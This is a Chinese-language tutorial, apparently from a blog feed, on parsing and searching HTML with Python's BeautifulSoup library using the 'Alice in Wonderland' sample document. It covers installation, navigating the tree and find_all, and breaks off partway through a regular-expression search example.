        <content type="html"><![CDATA[<h1 id="beautifulsoup"><a href="#beautifulsoup" class="headerlink" title="beautifulsoup"></a>beautifulsoup</h1><h2 id="一、beautifulsoup的简单使用"><a href="#一、beautifulsoup的简单使用" class="headerlink" title="一、beautifulsoup的简单使用"></a>一、beautifulsoup的简单使用</h2><p>简单来说，Beautiful Soup是python的一个库，最主要的功能是从网页抓取数据。官方解释如下：</p><p>Beautiful Soup提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。<br>它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。</p><h3 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure><h4 id="1-1解析器"><a href="#1-1解析器" class="headerlink" title="1.1解析器"></a><strong>1.1解析器</strong></h4><p>Beautiful Soup支持Python标准库中的HTML解析器,还支持一些第三方的解析器，如果我们不安装它，则 Python 会使用 Python默认的解析器，lxml 解析器更加强大，速度更快，推荐安装。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install lxml</span><br></pre></td></tr></table></figure><h4 id="1-2-解析器对比"><a href="#1-2-解析器对比" class="headerlink" title="1.2 解析器对比"></a>1.2 解析器对比</h4><p><a href="http://beautifulsoup.readthedocs.io/zh_CN/latest/">官网文档</a></p><h3 id="2、快速开始"><a href="#2、快速开始" class="headerlink" title="2、快速开始"></a>2、快速开始</h3><p>下面的一段HTML代码将作为例子被多次用到.这是 <em>爱丽丝梦游仙境的</em> 的一段内容(以后内容中简称为 <em>爱丽丝</em> 的文档):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">html_doc = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;</span></span><br><span class="line"><span class="string">and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>使用BeautifulSoup解析这段代码,能够得到一个 <code>BeautifulSoup</code> 的对象,并能按照标准的缩进格式的结构输出:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html_doc, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"><span class="comment"># html进行美化</span></span><br><span class="line"><span class="built_in">print</span>(soup.prettify())</span><br></pre></td></tr></table></figure><p>匹配代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;</span><br><span class="line">   The Dormouse<span class="string">&#x27;s story</span></span><br><span class="line"><span class="string">  &lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;p class=&quot;title&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;b&gt;</span></span><br><span class="line"><span class="string">    The Dormouse&#x27;</span>s story</span><br><span class="line">   &lt;/b&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p <span class="keyword">class</span>=<span class="string">&quot;story&quot;</span>&gt;</span><br><span class="line">   Once upon a time there were three little sisters; <span class="keyword">and</span> their names were</span><br><span class="line">   &lt;a <span class="keyword">class</span>=<span class="string">&quot;sister&quot;</span> href=<span class="string">&quot;http://example.com/elsie&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link1&quot;</span>&gt;</span><br><span class="line">    Elsie</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   ,</span><br><span class="line">   &lt;a <span class="keyword">class</span>=<span class="string">&quot;sister&quot;</span> href=<span class="string">&quot;http://example.com/lacie&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>&gt;</span><br><span class="line">    Lacie</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   <span class="keyword">and</span></span><br><span class="line">   &lt;a <span class="keyword">class</span>=<span class="string">&quot;sister&quot;</span> href=<span class="string">&quot;http://example.com/tillie&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link3&quot;</span>&gt;</span><br><span class="line">    Tillie</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   ;</span><br><span class="line"><span class="keyword">and</span> they lived at the bottom of a well.</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p <span class="keyword">class</span>=<span class="string">&quot;story&quot;</span>&gt;</span><br><span class="line">   ...</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>几个简单的浏览结构化数据的方法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">soup.title  <span class="comment"># 获取标签title</span></span><br><span class="line"><span class="comment"># &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;</span></span><br><span class="line"></span><br><span class="line">soup.title.name   <span class="comment"># 获取标签名称</span></span><br><span class="line"><span class="comment"># &#x27;title&#x27;</span></span><br><span class="line"></span><br><span class="line">soup.title.string   <span class="comment"># 获取标签title内的内容</span></span><br><span class="line"><span class="comment"># &#x27;The Dormouse&#x27;s story&#x27;</span></span><br><span class="line"></span><br><span class="line">soup.title.parent  <span class="comment"># 获取父级标签</span></span><br><span class="line"></span><br><span class="line">soup.title.parent.name  <span class="comment"># 获取父级标签名称</span></span><br><span class="line"><span class="comment"># &#x27;head&#x27;</span></span><br><span class="line"></span><br><span class="line">soup.p</span><br><span class="line"><span class="comment"># &lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"></span><br><span class="line">soup.p[<span class="string">&#x27;class&#x27;</span>]  <span class="comment"># 获取p的class属性值</span></span><br><span class="line"><span class="comment"># &#x27;title&#x27;</span></span><br><span class="line"></span><br><span class="line">soup.a</span><br><span class="line"><span class="comment"># &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line">soup.find_all(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br><span class="line"></span><br><span class="line">soup.find(<span class="built_in">id</span>=<span class="string">&quot;link3&quot;</span>)  <span class="comment"># 获取id为link3的标签</span></span><br><span class="line"><span class="comment"># &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从文档中找到所有&lt;a&gt;标签的链接:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(link.get(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line">    <span class="comment"># http://example.com/elsie</span></span><br><span class="line">    <span class="comment"># http://example.com/lacie</span></span><br><span class="line">    <span class="comment"># http://example.com/tillie</span></span><br></pre></td></tr></table></figure><p>从文档中获取所有文字内容:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.get_text())</span><br></pre></td></tr></table></figure><h3 id="3、如何使用"><a href="#3、如何使用" class="headerlink" title="3、如何使用"></a>3、如何使用</h3><p>将一段文档传入BeautifulSoup 的构造方法,就能得到一个文档的对象, 可以传入一段字符串或一个文件句柄.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(<span class="built_in">open</span>(<span class="string">&quot;index.html&quot;</span>))</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(<span class="string">&quot;&lt;html&gt;data&lt;/html&gt;&quot;</span>, <span class="string">&#x27;lxml&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后,Beautiful Soup选择最合适的解析器来解析这段文档,如果手动指定解析器那么Beautiful Soup会选择指定的解析器来解析文档。</p><h2 id="二、beautifulsoup的遍历文档树"><a href="#二、beautifulsoup的遍历文档树" class="headerlink" title="二、beautifulsoup的遍历文档树"></a>二、beautifulsoup的遍历文档树</h2><p>还拿”爱丽丝梦游仙境”的文档来做例子:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">html_doc = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;</span></span><br><span class="line"><span class="string">and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="comment"># lxml和html.parser解析的有时候会根据html是否完整而有解析不同的问题，需要注意</span></span><br><span class="line">soup = BeautifulSoup(html_doc, <span class="string">&#x27;html.parser&#x27;</span>)</span><br></pre></td></tr></table></figure><p>通过这段例子来演示怎样从文档的一段内容找到另一段内容</p><h3 id="1、子节点"><a href="#1、子节点" class="headerlink" title="1、子节点"></a>1、子节点</h3><p>一个Tag可能包含多个字符串或其它的Tag,这些都是这个Tag的子节点.Beautiful Soup提供了许多操作和遍历子节点的属性.</p><p>注意: Beautiful Soup中字符串节点不支持这些属性,因为字符串没有子节点。</p><h4 id="1-1-contents"><a href="#1-1-contents" class="headerlink" title="1.1 .contents"></a>1.1 .contents</h4><p>tag的 <code>.contents</code> 属性可以将tag的子节点以列表的方式输出:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">head_tag = soup.head</span><br><span class="line">head_tag</span><br><span class="line"><span class="comment"># &lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"></span><br><span class="line">head_tag.contents</span><br><span class="line">[&lt;title&gt;The Dormouse<span class="string">&#x27;s story&lt;/title&gt;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">title_tag = head_tag.contents[0]</span></span><br><span class="line"><span class="string">title_tag</span></span><br><span class="line"><span class="string"># &lt;title&gt;The Dormouse&#x27;</span>s story&lt;/title&gt;</span><br><span class="line">title_tag.contents</span><br><span class="line"><span class="comment"># [u&#x27;The Dormouse&#x27;s story&#x27;]</span></span><br></pre></td></tr></table></figure><p>字符串没有 <code>.contents</code> 属性,因为字符串没有子节点:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text = title_tag.contents[<span class="number">0</span>]</span><br><span class="line">text.contents</span><br><span class="line"><span class="comment"># AttributeError: &#x27;NavigableString&#x27; object has no attribute &#x27;contents&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="2、-节点内容"><a href="#2、-节点内容" class="headerlink" title="2、 节点内容"></a>2、 节点内容</h3><h4 id="2-1-string"><a href="#2-1-string" class="headerlink" title="2.1 .string"></a>2.1 .string</h4><p>如果tag只有一个 <code>NavigableString</code> 类型子节点,那么这个tag可以使用 <code>.string</code> 得到子节点。如果一个tag仅有一个子节点,那么这个tag也可以使用 <code>.string</code> 方法,输出结果与当前唯一子节点的 <code>.string</code> 结果相同。</p><p>通俗点说就是：如果一个标签里面没有标签了，那么 .string 就会返回标签里面的内容。如果标签里面只有唯一的一个标签了，那么 .string 也会返回最里面的内容。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> (soup.head.string)</span><br><span class="line"><span class="comment">#The Dormouse&#x27;s story</span></span><br><span class="line"><span class="comment"># &lt;title&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="built_in">print</span> (soup.title.string)</span><br><span class="line"><span class="comment">#The Dormouse&#x27;s story</span></span><br></pre></td></tr></table></figure><p>如果tag包含了多个子节点,tag就无法确定，string 方法应该调用哪个子节点的内容, .string 的输出结果是 None</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> (soup.html.string)</span><br><span class="line"><span class="comment">#None</span></span><br></pre></td></tr></table></figure><h4 id="2-2-text"><a href="#2-2-text" class="headerlink" title="2.2 .text"></a>2.2 .text</h4><p>如果tag包含了多个子节点, text则会返回内部所有文本内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (soup.html.text)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><p>strings和text都可以返回所有文本内容  </p><p>区别：text返回内容为字符串类型  strings为生成器generator</p><h3 id="3、-多个内容"><a href="#3、-多个内容" class="headerlink" title="3、 多个内容"></a>3、 <strong>多个内容</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.strings .stripped_strings 属性</span><br></pre></td></tr></table></figure><h4 id="3-1-strings"><a href="#3-1-strings" class="headerlink" title="3.1**.strings**"></a>3.1**.strings**</h4><p>获取多个内容，不过需要遍历获取，比如下面的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> soup.strings:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">repr</span>(string))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  &#x27;\n&#x27;</span></span><br><span class="line"><span class="string">&quot;The Dormouse&#x27;s story&quot;</span></span><br><span class="line"><span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="string">&quot;The Dormouse&#x27;s story&quot;</span></span><br><span class="line"><span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="string">&#x27;Once upon a time there were three little sisters; and their names were\n&#x27;</span></span><br><span class="line"><span class="string">&#x27;Elsie&#x27;</span></span><br><span class="line"><span class="string">&#x27;,\n&#x27;</span></span><br><span class="line"><span class="string">&#x27;Lacie&#x27;</span></span><br><span class="line"><span class="string">&#x27; and\n&#x27;</span></span><br><span class="line"><span class="string">&#x27;Tillie&#x27;</span></span><br><span class="line"><span class="string">&#x27;;\nand they lived at the bottom of a well.&#x27;</span></span><br><span class="line"><span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="string">&#x27;...&#x27;</span></span><br><span class="line"><span class="string">&#x27;\n&#x27;  </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>    </span><br></pre></td></tr></table></figure><h4 id="3-2-stripped-strings"><a href="#3-2-stripped-strings" class="headerlink" title="3.2 .stripped_strings"></a>3.2 <strong>.stripped_strings</strong></h4><p>输出的字符串中可能包含了很多空格或空行,使用 <code>.stripped_strings</code> 可以去除多余空白内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> soup.stripped_strings:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">repr</span>(string))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;The Dormouse&#x27;s story&quot;</span></span><br><span class="line"><span class="string">&quot;The Dormouse&#x27;s story&quot;</span></span><br><span class="line"><span class="string">&#x27;Once upon a time there were three little sisters; and their names were&#x27;</span></span><br><span class="line"><span class="string">&#x27;Elsie&#x27;</span></span><br><span class="line"><span class="string">&#x27;,&#x27;</span></span><br><span class="line"><span class="string">&#x27;Lacie&#x27;</span></span><br><span class="line"><span class="string">&#x27;and&#x27;</span></span><br><span class="line"><span class="string">&#x27;Tillie&#x27;</span></span><br><span class="line"><span class="string">&#x27;;\nand they lived at the bottom of a well.&#x27;</span></span><br><span class="line"><span class="string">&#x27;...&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="4、-父节点"><a href="#4、-父节点" class="headerlink" title="4、 父节点"></a>4、 父节点</h3><p>继续分析文档树,每个tag或字符串都有父节点:被包含在某个tag中</p><h4 id="4-1-parent"><a href="#4-1-parent" class="headerlink" title="4.1 .parent"></a>4.1 .parent</h4><p>通过 <code>.parent</code> 属性来获取某个元素的父节点.在例子“爱丽丝”的文档中,&lt;head&gt;标签是&lt;title&gt;标签的父节点:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">title_tag = soup.title</span><br><span class="line">title_tag</span><br><span class="line"><span class="comment"># &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;</span></span><br><span class="line">title_tag.parent</span><br><span class="line"><span class="comment"># &lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span></span><br></pre></td></tr></table></figure><p>文档的顶层节点比如&lt;html&gt;的父节点是 <code>BeautifulSoup</code> 对象:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">html_tag = soup.html</span><br><span class="line"><span class="built_in">type</span>(html_tag.parent)</span><br><span class="line"><span class="comment"># &lt;class &#x27;bs4.BeautifulSoup&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="三、beautifulsoup的搜索文档树"><a href="#三、beautifulsoup的搜索文档树" class="headerlink" title="三、beautifulsoup的搜索文档树"></a>三、beautifulsoup的搜索文档树</h2><h3 id="1、find-all"><a href="#1、find-all" class="headerlink" title="1、find_all"></a>1、find_all</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find_all( name , attrs , recursive , string , **kwargs )</span><br></pre></td></tr></table></figure><p><code>find_all()</code> 方法搜索当前tag的所有tag子节点,并判断是否符合过滤器的条件:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(<span class="string">&quot;title&quot;</span>)</span><br><span class="line"><span class="comment"># [&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]</span></span><br><span class="line"></span><br><span class="line">soup.find_all(<span class="string">&quot;p&quot;</span>, <span class="string">&quot;title&quot;</span>)</span><br><span class="line"><span class="comment"># [&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;]</span></span><br><span class="line"></span><br><span class="line">soup.find_all(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br><span class="line"></span><br><span class="line">soup.find_all(<span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># 模糊查询 包含sisters的就可以</span></span><br><span class="line">soup.find(string=re.<span class="built_in">compile</span>(<span class="string">&quot;sisters&quot;</span>))</span><br><span class="line"><span class="comment"># &#x27;Once upon a time there were three little sisters; and their names were\n&#x27;</span></span><br></pre></td></tr></table></figure><p>有几个方法很相似,还有几个方法是新的,参数中的 <code>string</code> 和 <code>id</code> 是什么含义? 为什么 <code>find_all(&quot;p&quot;, &quot;title&quot;)</code> 返回的是CSS Class为”title”的&lt;p&gt;标签? 我们来仔细看一下 <code>find_all()</code> 的参数.</p><h4 id="1-1-name-参数"><a href="#1-1-name-参数" class="headerlink" title="1.1 name 参数"></a>1.1 name 参数</h4><p><code>name</code> 参数可以查找所有名字为 <code>name</code> 的tag,字符串对象会被自动忽略掉.</p><p>简单的用法如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(<span class="string">&quot;title&quot;</span>)</span><br><span class="line"><span class="comment"># [&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]</span></span><br></pre></td></tr></table></figure><p>搜索 <code>name</code> 参数的值可以使任一类型的 过滤器 ,字符串,正则表达式,列表,方法或是 <code>True</code> .</p><p><strong>&lt;1&gt; 传字符串</strong></p><p>最简单的过滤器是字符串.在搜索方法中传入一个字符串参数,Beautiful Soup会查找与字符串完整匹配的内容,下面的例子用于查找文档中所有的<b>标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="comment"># [&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;]</span></span><br></pre></td></tr></table></figure><p><strong>&lt;2&gt; 传正则表达式</strong></p><p>如果传入正则表达式作为参数,Beautiful Soup会通过正则表达式的 <code>match()</code> 来匹配内容.下面例子中找出所有以b开头的标签,这表示&lt;body&gt;和&lt;b&gt;标签都应该被找到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(re.<span class="built_in">compile</span>(<span class="string">&quot;^b&quot;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(tag.name)</span><br><span class="line"><span class="comment"># body</span></span><br><span class="line"><span class="comment"># 